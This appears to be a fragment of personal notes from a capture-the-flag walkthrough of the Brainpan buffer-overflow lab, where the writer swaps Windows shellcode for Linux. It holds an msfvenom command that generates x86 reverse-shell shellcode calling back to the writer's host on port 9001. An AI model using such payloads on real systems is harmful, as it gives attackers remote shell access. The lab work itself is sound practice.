we are in a linux box via the brainpan binary running via wine

![[Pasted image 20210531155117.png]]

now lets get the linux shell and use `x86` architecture 

`msfvenom -p  linux/x86/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -b "\x00"`

replace it with the windows shell code


![[Pasted image 20210531162630.png]]

